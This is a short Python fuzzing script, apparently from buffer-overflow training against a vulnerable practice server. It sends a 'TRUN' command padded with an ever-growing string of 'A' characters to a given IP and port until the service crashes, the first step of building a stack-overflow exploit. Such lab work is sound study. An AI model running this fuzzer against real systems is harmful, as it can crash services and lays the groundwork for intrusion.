import socket
import sys

# how to execute:
# python overflow.py 192.168.1.109 9999
# stop with 2000

ip = sys.argv[1]
port = int(sys.argv[2])

junk = ("A" * 1000)


# sending junk
while True:
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.recv(1024)
    print("Fuzzing: " + str(len(junk)))
    s.send("TRUN /.:/" + junk + "\n")
    s.recv(1024)
    s.close()
    junk += ("A" * 100)
  except:
    sys.exit(0)